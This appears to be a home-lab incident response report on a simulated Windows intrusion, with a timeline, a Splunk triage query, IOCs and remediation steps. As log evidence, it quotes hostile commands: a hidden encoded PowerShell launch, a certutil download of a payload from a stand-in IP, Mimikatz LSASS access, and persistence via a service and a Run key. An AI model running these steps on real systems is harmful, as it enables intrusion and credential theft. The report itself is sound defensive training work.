# Incident Response Report — Simulated Intrusion (SOC Home Lab)

| Field | Value |
|-------|-------|
| **Report ID** | IR-2026-001 |
| **Classification** | Lab / Training (TLP:CLEAR) |
| **Analyst** | Kuldeep J. Jotaniya |
| **Date of report** | 2026-06-03 |
| **Affected host** | WIN10-VICTIM (10.10.10.20) |
| **Detection source** | Splunk SIEM (index=windows), Sysmon, Windows Event Logs |
| **Overall severity** | **High** |
| **Status** | Closed — contained & remediated (lab) |

> This report documents a simulated end-to-end intrusion executed with Atomic
> Red Team against the lab's Victim VM and detected through the Splunk detection
> use cases. It follows the **NIST SP 800-61r2** incident response lifecycle:
> Preparation → Detection & Analysis → Containment, Eradication & Recovery →
> Post-Incident Activity.

---

## 1. Executive Summary

On 2026-06-02, the SOC home lab SIEM generated a Critical alert for LSASS memory
access on host **WIN10-VICTIM**. Investigation revealed a full attack chain: an
initial malicious PowerShell execution, tool download via `certutil`, credential
dumping with a Mimikatz-style tool, persistence via a new Windows service and a
registry Run key, creation of a backdoor account, and finally clearing of the
Security event log to cover tracks.

The activity mapped to **7 MITRE ATT&CK techniques** and was fully reconstructed
from Splunk telemetry. Because logs were forwarded to the SIEM via the Universal
Forwarder, the attacker's log-clearing (T1070.001) did **not** destroy the
evidence. The host was isolated, persistence removed, the backdoor account
disabled, and credentials reset.

## 2. Timeline of Events

| # | Time (UTC) | Technique | Event | Evidence |
|---|-----------|-----------|-------|----------|
| 1 | 2026-06-02 13:04 | T1059.001 | Encoded PowerShell launched from `cmd.exe` | Security 4688, `powershell -nop -w hidden -enc ...` |
| 2 | 2026-06-02 13:05 | T1105 | Payload downloaded with certutil | Sysmon 1, `certutil -urlcache -split -f http://192.0.2.66/payload.exe` |
| 3 | 2026-06-02 13:07 | T1003.001 | LSASS accessed by `mimikatz.exe` | Sysmon 10, `GrantedAccess=0x1410` |
| 4 | 2026-06-02 13:09 | T1543.003 | New service `UpdaterSvc` installed | System 7045, `ServiceFileName=C:\Users\Public\AppData\evil.exe` |
| 5 | 2026-06-02 13:10 | T1547.001 | Registry Run key persistence added | Sysmon 13, `...\CurrentVersion\Run\Updater` |
| 6 | 2026-06-02 13:12 | T1136 | Backdoor account `svc_backup` created | Security 4720 |
| 7 | 2026-06-02 13:15 | T1070.001 | Security event log cleared | Security 1102 |

## 3. Detection & Analysis

The incident was first surfaced by detection use case **UC-004 (LSASS Access)**,
which fired Critical. Pivoting on the host and a ±15-minute window in Splunk
revealed the surrounding events. The triage SPL used:

```spl
index=windows host=WIN10-VICTIM earliest=-20m@m latest=now
| eval technique=case(
    EventCode=4688 AND like(CommandLine,"%powershell%"),"T1059.001 PowerShell",
    EventCode=10,"T1003.001 LSASS",
    EventCode=7045,"T1543.003 New Service",
    EventCode=13,"T1547.001 Run Key",
    EventCode=4720,"T1136 Create Account",
    EventCode=1102,"T1070.001 Log Cleared")
| where isnotnull(technique)
| table _time technique CommandLine ServiceFileName TargetObject
| sort _time
```

## 4. Indicators of Compromise (IOCs)

| Type | Indicator | Context |
|------|-----------|---------|
| IPv4 | `192.0.2.66` | Payload host / brute-force source |
| URL | `http://192.0.2.66/payload.exe` | Second-stage download |
| File | `C:\Users\Public\p.exe` | Dropped payload |
| File | `C:\Users\Public\AppData\evil.exe` | Malicious service binary |
| Service | `UpdaterSvc` | Persistence service |
| Reg key | `HKLM\...\CurrentVersion\Run\Updater` | Persistence |
| Account | `svc_backup` | Attacker-created backdoor |

## 5. Containment, Eradication & Recovery

1. **Contain** — Isolated WIN10-VICTIM from the lab network; preserved a memory
   image and disk snapshot before changes.
2. **Eradicate** — Deleted service `UpdaterSvc`, removed the Run key, removed the
   dropped binaries, disabled and removed the `svc_backup` account.
3. **Recover** — Reset all credentials that were resident on the host, re-imaged
   the VM from a known-good baseline, confirmed clean telemetry post-restore.

## 6. Root Cause

Initial access was simulated via a user executing a malicious encoded PowerShell
command (phishing-style payload). Lack of constrained-language mode and absence
of application allow-listing let the chain proceed.

## 7. Lessons Learned & Recommendations

- **Forward logs off-host** — the Universal Forwarder preserved evidence despite
  T1070.001 log clearing. Keep this control.
- **Enable PowerShell Script Block Logging** (EventID 4104) for deeper PowerShell
  visibility.
- **Restrict LOLBins** — block/monitor `certutil`, `bitsadmin` for downloads.
- **Tune UC-002** to auto-escalate when a brute-force burst precedes a 4624.
- **Deploy LSASS protection** (RunAsPPL / Credential Guard) to prevent dumping.
- **Alert on new service + new local admin within a short window** as a high-
  fidelity correlated detection.

## 8. MITRE ATT&CK Coverage

See [`../mitre/attack_navigator_layer.json`](../mitre/attack_navigator_layer.json)
for the full Navigator layer. Techniques exercised in this incident: T1059.001,
T1105, T1003.001, T1543.003, T1547.001, T1136, T1070.001.
